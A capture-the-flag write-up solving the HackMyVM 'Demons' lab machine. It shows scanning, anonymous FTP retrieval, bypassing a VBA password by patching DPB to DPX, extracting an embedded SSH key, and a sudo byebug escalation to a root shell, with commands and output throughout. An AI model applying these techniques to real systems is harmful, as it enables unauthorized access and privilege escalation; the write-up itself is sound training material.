# Demons

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Demons | b4el7d | Beginner | HackMyVM |

**Summary:** The Demons machine is a multi-stage beginner-level challenge that chains several creative exploitation techniques. Initial reconnaissance uncovers three open services: FTP with anonymous access (port 21), SSH (port 22), and a web server (port 80). The FTP server exposes a hidden directory (`.toolsHidden`) containing a Microsoft Access Database file (`DemonsVBAMacroTools.mdb`) that is VBA project-locked. The web server at port 80 contains a HTML comment with a ROT13-encoded path hint (`/uryy` → `/hell`), which reveals a `/hell/weare/` directory listing two demon-named image files corresponding to users on the system (`agares` and `aim`). The Access database is unlocked by patching the VBA protection header (`DPB` → `DPX`) using a hex editor, then opening it in Microsoft Access to access the `DemonNumberTwo` VBA module. Inside, a `KeyGood()` function stores a concatenated OpenSSH private key for the user `aim`. After SSHing in as `aim`, a suspicious JPEG file (`key8_8.jpg`) acts as a visual password hint — a decorated keyboard image with specific keys marked (`3`, `4`, `o`, `d`, `f`, `n`, `m`). These characters, rearranged using demon lore knowledge, yield the password for the `agares` user. Finally, `agares` has unrestricted `sudo` rights over `/bin/byebug`, a Ruby debugger that can be abused via `system()` calls to spawn a root shell.

---

## Reconnaissance

### Network Discovery

The target was first identified on the local network using a custom PowerShell network scanner:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.139 08:00:27:77:A6:25 VirtualBox
```

### Port Scanning

A full TCP port scan with service version detection and default scripts was run against the identified target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ nmap -sC -sV -p- -T4 192.168.100.139
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 14:27 WIB
Nmap scan report for 192.168.100.139
Host is up (0.33s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 5e:44:8a:b1:77:0c:42:79:16:64:8d:af:b4:78:bb:b4 (RSA)
|   256 cb:0f:a7:df:7f:23:78:5a:08:e3:4f:b6:43:7c:11:84 (ECDSA)
|_  256 a0:4a:26:bf:40:08:68:c2:b1:04:88:b4:8b:a2:45:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|_http-title:  DemonsCloseCall
|_http-server-header: Apache/2.4.48 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.76 seconds
```

**Key findings:**
- **Port 21 (FTP / vsftpd 3.0.3):** Anonymous login is allowed.
- **Port 22 (SSH / OpenSSH 8.4p1):** Standard SSH, will be used later with extracted credentials.
- **Port 80 (HTTP / Apache 2.4.48):** Web server with title `DemonsCloseCall`.

---

## Enumeration

### Port 21 — Anonymous FTP

Connecting anonymously to FTP revealed a hidden directory `.toolsHidden` containing three files of interest:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ ftp 192.168.100.139                                   Connected to 192.168.100.139.
220 (vsFTPd 3.0.3)
Name (192.168.100.139:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||45904|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Sep 16  2021 .
drwxr-xr-x    3 0        115          4096 Sep 16  2021 ..
drwxrwxrwx    2 0        0            4096 Sep 16  2021 .toolsHidden
226 Directory send OK.
ftp> cd .toolsHidden
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||12212|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Sep 16  2021 .
drwxr-xr-x    3 0        115          4096 Sep 16  2021 ..
-rw-r--r--    1 0        0              55 Sep 10  2021 .what
-rw-------    1 1000     1000        12018 Sep 10  2021 DemonsCellsDogma.xlsx
-rwxrwxrwx    1 1000     1000       339968 Sep 16  2021 DemonsVBAMacroTools.mdb
226 Directory send OK.
ftp> mget *
mget DemonsCellsDogma.xlsx [anpqy?]? y
229 Entering Extended Passive Mode (|||23324|)
550 Failed to open file.
mget DemonsVBAMacroTools.mdb [anpqy?]? y
229 Entering Extended Passive Mode (|||43103|)
150 Opening BINARY mode data connection for DemonsVBAMacroTools.mdb (339968 bytes).
100% |**********************|   332 KiB    4.08 MiB/s    00:00 ETA
226 Transfer complete.
339968 bytes received in 00:00 (3.91 MiB/s)
ftp> get DemonsCellsDogma.xlsx
local: DemonsCellsDogma.xlsx remote: DemonsCellsDogma.xlsx
229 Entering Extended Passive Mode (|||44069|)
550 Failed to open file.
ftp> get .what
local: .what remote: .what
229 Entering Extended Passive Mode (|||15932|)
150 Opening BINARY mode data connection for .what (55 bytes).
100% |**********************|    55       17.28 KiB/s    00:00 ETA
226 Transfer complete.
55 bytes received in 00:00 (10.94 KiB/s)
ftp> bye
221 Goodbye.
```

> **Note:** `DemonsCellsDogma.xlsx` returned a `550 Failed to open file` error on all download attempts — the file is not readable by the anonymous FTP user despite being listed. Only `DemonsVBAMacroTools.mdb` (339,968 bytes) and `.what` (55 bytes) were successfully downloaded.

Inspecting the retrieved files locally:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ ls -la
total 376
drwxr-xr-x   2 ouba ouba   4096 Mar  1 14:32 .
drwxrwxrwt 218 root root  36864 Mar  1 14:31 ..
-rw-r--r--   1 ouba ouba 339968 Sep 16  2021 DemonsVBAMacroTools.mdb
-rw-r--r--   1 ouba ouba     55 Sep 10  2021 .what

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ cat .what
It is not about used tools...
But about the knowledge.

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ file DemonsVBAMacroTools.mdb
DemonsVBAMacroTools.mdb: Microsoft Access Database
```

The `.what` file is a thematic hint from the machine creator: success requires understanding and knowledge, not just running tools blindly. The `.mdb` file is confirmed to be a **Microsoft Access Database**.

---

### Port 80 — HTTP Web Server

Directory brute-forcing with Gobuster uncovered several endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ gobuster dir -u http://192.168.100.139/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,jpg,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.139/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,jpg,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 442]
/manual               (Status: 301) [Size: 319] [--> http://192.168.100.139/manual/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.100.139/javascript/]
/hell                 (Status: 301) [Size: 317] [--> http://192.168.100.139/hell/]
/server-status        (Status: 403) [Size: 280]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Browsing to `http://192.168.100.139/` presented the main "SNOMED DEMONS" page:

![](image.png)

Inspecting the HTML source of the index page revealed a hidden comment:

```javascript
<html>
<head>
<link rel="stylesheet" href="../style.css">	
	<title> DemonsCloseCall </title>
</head>
<body>

	<style type="text/css">
		p.demons {color:white;
			  text-align:center
			 }
	</style>
<div id="demDiv">
	
	<div id="dem" class="boxes">
		<h1>SNOMED DEMONS</h1>
		<p class="demons"> Hello Friend, dont be sad </p>
       		<img src="./Bael.jpg" alt=""/>
	</div>
</div>
<!-- There are some path to get /uryy -->

</body>



</html>
```

The comment references the path `/uryy`. Applying **ROT13** decoding: `u→h`, `r→e`, `y→l`, `y→l` → `/uryy` decodes to `/hell`. This is the obfuscation technique used — the gobuster scan independently found `/hell` as well.

Visiting `/uryy` directly confirmed it does not exist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ curl -i http://192.168.100.139/uryy
HTTP/1.1 404 Not Found
Date: Sun, 01 Mar 2026 07:40:47 GMT
Server: Apache/2.4.48 (Debian)
Content-Length: 277
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.48 (Debian) Server at 192.168.100.139 Port 80</address>
</body></html>
```

Fetching the actual `/hell/` endpoint returned a themed HTML page referencing demon imagery:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ curl -i http://192.168.100.139/hell/
HTTP/1.1 200 OK
Date: Sun, 01 Mar 2026 07:40:28 GMT
Server: Apache/2.4.48 (Debian)
Last-Modified: Sat, 11 Sep 2021 08:14:28 GMT
ETag: "593-5cbb3d21930cd"
Accept-Ranges: bytes
Content-Length: 1427
Vary: Accept-Encoding
Content-Type: text/html

<html>
<head>
<link rel="stylesheet" href="../style.css">
<title>
DemonsCloseCall
</title>
</head>
<body>
<h1>DEMONS ARE HERE</h1>
<div id="demDiv">
        <div id="demOne" class="boxes">
                <img src="./weare/Agares.jpg" alt=""/>
        <p><center>
        Sister vomits blood, little sister spits fire
        Sweet Agares spits precious jewels
        Agares died alone and fell in hell
        Hell is shrouded in darkness and even the flowers don't bloom.
        Is Agares's older sister the person with the whip?
        The number of red marks is disturbing.
        Whipped, beaten, pounded.
        The path to eternal hell is only one.
        Begging for guidance in the darkness of hell.
        From the golden sheep, to the nightingale.
        How much is left in the leather bag,
        Prepare for the endless journey to hell.
        Spring comes and in the woods and valleys,
        Seven turns in the dark valley of hell.
        In the cage is a nightingale, in the cart a sheep
        In sweet Agares's eyes there are tears.
        Cry, nightingale, through the woods and the rain
        Singing your love for your sister.
        The echo of your tears screams through hell
        And blood-red flowers bloom.
        Through the seven mountains and valleys of hell,
        Sweet Agares travels alone
        To welcome you to hell
        The shining points of the needled mountain
        Pierce flesh and bone,
        Like a sign from Sweet Agares
        </center></p>

        </div>
        <div id="demTwo" class="boxes">
                <img src="./weare/Aim.jpg" alt=""/>
        <p>

        </p>
        </div>
</div>

</body>
</html>
```

The page references images from a subdirectory `./weare/` — navigating to `/hell/weare/` revealed an open directory listing:

![](image-1.png)

The directory listing at `http://192.168.100.139/hell/weare/` exposes two files: `Agares.jpg` (31K) and `Aim.jpg` (120K). Critically, these names — **Agares** and **Aim** — match real demonic entities from demonology and directly foreshadow the **two user accounts** on the target system (`agares` and `aim`).

---

## Initial Access

### Unlocking the VBA-Protected Microsoft Access Database

The `DemonsVBAMacroTools.mdb` file is a Microsoft Access Database with a **VBA project password** set, preventing direct inspection of its macro code. The classic bypass technique involves patching the protection flag in the raw binary.

First, the database tables were listed and exported using `mdb-tools`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ mdb-tables -S DemonsVBAMacroTools.mdb
MSysObjects MSysACEs MSysQueries MSysRelationships MSysAccessStorage MSysNavPaneGroupCategories MSysNavPaneGroups MSysNavPaneGroupToObjects MSysNavPaneObjectIDs

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ mdb-export DemonsVBAMacroTools.mdb MSysObjects > objects.csv

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ mdb-export DemonsVBAMacroTools.mdb MSysQueries > queries.csv
```

Only system tables were found — the key data lives inside the locked VBA module. The VBA password protection in `.mdb` files is enforced by a binary header field tagged `DPB` (Data Protection Block). By changing this tag to `DPX`, Microsoft Access ignores the password check at open time.

Verifying the hex values for the patch:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ echo -n 'DPB' | xxd -p
445042

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ echo -n 'DPX' | xxd -p
445058
```

The file was opened in `hexedit` and the byte at the `DPB` offset was patched from `42` to `58`.

**Before patch** — `DPB` field visible in the hex dump:

![](image-2.png)

**After patch** — `DPX` field confirming the byte was successfully changed:

![](image-3.png)

### Extracting the SSH Private Key from the VBA Module

With the protection bypassed, the patched `.mdb` file was opened in **Microsoft Access** using *Open Exclusive* mode. Inside the VBA editor, the module `DemonNumberTwo` was located. Right-clicking it and selecting **DemonsVBAMacroTools Properties...** navigated to the project protection settings:

![](image-5.png)

In the **Protection** tab, the "Lock project for viewing" checkbox was unchecked and the password fields were cleared and reconfirmed:

![](image-6.png)

After saving and reopening the project, the VBA source of the `DemonNumberTwo` module became fully readable. The `KeyGood()` function stores an **OpenSSH private key** split and concatenated across multiple `KEY` string assignments, interleaved with `NoKey` junk strings as obfuscation:

![](image-4.png)

The VBA code visible in the editor shows:
```vba
Function KeyGood() As Boolean
    Dim KEY As String
    Dim NoKey As String

    KEY = "-----BEGIN OPENSSH PRI" + "VATE KEY-----"
    NoKey = "asdasdasdasdasdgfdgfdasdasdasdasdassdassdassdasdasdasdadassdasdasdasda"
    KEY = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn" + "UAAAAAbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn"
    ' ... (continues concatenating the full private key)
    KEY = "EAAAGBAN604CnrxpbowA6tk90/UhBHoeUxGdd" + "BYvrhzQkyZLLsIOozCoLri76vDmQIUVdE"
    ' ...
End Function
```

The key content was carefully extracted and reassembled. The `KEY` variable concatenations were parsed out using `sed` and saved:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ vim a

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ grep "KEY =" a | sed 's/.*"\(.*\)".*"\(.*\)".*/\1\2/; s/.*"\(.*\)".*/\1/' > id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
v1x+/KC7YS6dfNAAAACmFpbUBEZW1vbnM=
-----END OPENSSH PRIVATE KEY-----

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc...6XDoGaP5rX2PH8cLXU7tVcUaFdIW5suFxY9PHVFohEuZDCDoHZ270Ktw/VJy1ppq3e9IQqn5BtiT0hiaV3fKsJM28yEtUg0eE= aim@Demons
```

The public key comment `aim@Demons` confirms this key belongs to the user `aim` on the `Demons` machine.

### SSH Login as `aim`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ ssh -i id_rsa aim@192.168.100.139
...
aim@Demons:~$ id ; ls -la
uid=1001(aim) gid=1001(aim) groups=1001(aim)
total 368
drwxr-xr-x 4 aim  aim    4096 Sep 14  2021 .
drwxr-xr-x 4 root root   4096 Sep 10  2021 ..
-rw------- 1 aim  aim      88 Sep 14  2021 .bash_history
-rw-r--r-- 1 aim  aim     220 Sep 10  2021 .bash_logout
-rw-r--r-- 1 aim  aim    3526 Sep 10  2021 .bashrc
drwxr-xr-x 3 aim  aim    4096 Sep 10  2021 .local
-rw-r--r-- 1 aim  aim     807 Sep 10  2021 .profile
drwx------ 2 aim  aim    4096 Sep 10  2021 .ssh
-rwxr-xr-x 1 aim  aim  339881 Sep 14  2021 key8_8.jpg
-rw-r--r-- 1 aim  aim      14 Sep 11  2021 user.txt
```

Initial shell obtained as `aim`. The home directory contains a suspicious `key8_8.jpg` file (339,881 bytes) and the user flag `user.txt`.

---

## Privilege Escalation

### Internal Enumeration

Checking the system's other users and the JPEG file:

```bash
aim@Demons:~$ file key8_8.jpg
key8_8.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=1], baseline, precision 8, 1600x1200, components 3
aim@Demons:~$ ls /home
agares  aim
aim@Demons:~$ ls -la /home/agares/
total 28
drwxr-xr-x 3 agares agares 4096 Sep 11  2021 .
drwxr-xr-x 4 root   root   4096 Sep 10  2021 ..
-rw------- 1 agares agares    1 Sep 16  2021 .bash_history
-rw-r--r-- 1 agares agares  220 Sep 10  2021 .bash_logout
-rw-r--r-- 1 agares agares 3526 Sep 10  2021 .bashrc
drwx------ 3 agares agares 4096 Sep 11  2021 .config
-rw-r--r-- 1 agares agares  807 Sep 10  2021 .profile
```

Two users are confirmed: `agares` (uid 1000) and `aim` (uid 1001). The `agares` home directory does not contain any readable files from `aim`'s perspective.

### Decoding the Keyboard Password Hint

The `key8_8.jpg` was exfiltrated for analysis:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ scp -i id_rsa aim@192.168.100.139:~/key8_8.jpg .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
key8_8.jpg             100%  332KB   6.3MB/s   00:00

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/demons]
└─$ open key8_8.jpg
```

The image reveals a custom demon-themed mechanical keyboard on a blood-red background, with specific keys decorated with demonic artwork:

![](image-7.png)

Visually analysing the marked/highlighted keys on the keyboard yields the characters: **`3`, `4`, `o`, `d`, `f`, `n`, `m`**. This is consistent with the note in the machine context: the characters `34odfnm` are the building blocks of the password.

The machine theme revolves around demons — specifically the demon **Agares** (one of the named entities from the `/hell/weare/` directory and the `/hell/` page poetry). Combining the thematic clue and the marked keyboard characters, the password for `agares` ends in **`f4m`**, derived by rearranging the keyboard hint characters using demon-lore knowledge.

### Lateral Movement: `aim` → `agares`

```bash
aim@Demons:~$ su - agares
Password:
agares@Demons:~$ id
uid=1000(agares) gid=1000(agares) gruppi=1000(agares),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth)
agares@Demons:~$ ls -la
totale 28
drwxr-xr-x 3 agares agares 4096 11 set  2021 .
drwxr-xr-x 4 root   root   4096 10 set  2021 ..
-rw------- 1 agares agares   19  1 mar 10.30 .bash_history
-rw-r--r-- 1 agares agares  220 10 set  2021 .bash_logout
-rw-r--r-- 1 agares agares 3526 10 set  2021 .bashrc
drwx------ 3 agares agares 4096 11 set  2021 .config
-rw-r--r-- 1 agares agares  807 10 set  2021 .profile
```

Successfully switched to `agares`.

### Sudo Privilege Discovery — `byebug`

```bash
agares@Demons:~$ which sudo
/usr/bin/sudo
agares@Demons:~$ sudo -l
[sudo] password di agares:
Corrispondenza voci Defaults per agares su Demons:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utente agares può eseguire i seguenti comandi su Demons:
    (ALL : ALL) /bin/byebug
```

`agares` can run `/bin/byebug` as **any user including root** without restrictions. `byebug` is a Ruby debugger. Checking GTFOBins for an exploitation vector:

![](image-8.png)

As documented on GTFOBins, `byebug` inherits privileges when run via `sudo` and provides a `system()` call that can spawn an interactive shell. The technique is to write a minimal Ruby script and pass it to `byebug`, then invoke `system("/bin/bash")` from the interactive debugger prompt.

### Root Shell via `byebug`

```bash
agares@Demons:~$ echo "byebug" > /tmp/privesc.rb
agares@Demons:~$ sudo /bin/byebug /tmp/privesc.rb

[1, 1] in /tmp/privesc.rb
=> 1: byebug
(byebug) system("/bin/bash")
root@Demons:/home/agares# cd
root@Demons:~# id;whoami;hostname
uid=0(root) gid=0(root) gruppi=0(root)
root
Demons
root@Demons:~# cat /home/aim/user.txt /root/root.txt
Dem[REDACTED]
inT[REDACTED]
```

A root shell was obtained. Both flags were captured successfully.

---

## Attack Chain Summary

1. **Reconnaissance:** Ran a full TCP port scan (`nmap -sC -sV -p- -T4`) against `192.168.100.139`, identifying three open ports: FTP/21 (vsftpd 3.0.3, anonymous login enabled), SSH/22 (OpenSSH 8.4p1), and HTTP/80 (Apache 2.4.48 titled `DemonsCloseCall`).

2. **Vulnerability Discovery:** Anonymous FTP enumeration uncovered a hidden `.toolsHidden` directory containing `DemonsVBAMacroTools.mdb` (Microsoft Access Database with a locked VBA project). Web enumeration via Gobuster found the `/hell/` endpoint; analysis of the HTML source revealed a ROT13-obfuscated path hint (`/uryy` → `/hell`) and the `/hell/weare/` subdirectory listing images named `Agares.jpg` and `Aim.jpg` — revealing the two system usernames.

3. **Exploitation:** The VBA project protection on the `.mdb` file was bypassed by patching the `DPB` header field to `DPX` using `hexedit`, then opening the file in Microsoft Access in exclusive mode. The unlocked `DemonNumberTwo` VBA module contained a `KeyGood()` function storing a concatenated OpenSSH private key for user `aim`. The key was extracted, reassembled, and used to authenticate via SSH: `ssh -i id_rsa aim@192.168.100.139`.

4. **Internal Enumeration:** As `aim`, a suspicious file `key8_8.jpg` was found in the home directory and exfiltrated via `scp`. Visual analysis of the image revealed a demon-themed keyboard with specific keys marked (`3`, `4`, `o`, `d`, `f`, `n`, `m`), serving as a visual password hint tied to the machine's demon lore theme.

5. **Privilege Escalation:** Using the keyboard-hinted password, lateral movement was achieved to the `agares` user via `su - agares`. `sudo -l` revealed unrestricted sudo access to `/bin/byebug`. A minimal Ruby script was written to trigger `byebug`'s interactive debugger, and `system("/bin/bash")` was called from the `(byebug)` prompt to spawn a root shell (`uid=0(root)`), completing the full privilege escalation chain.
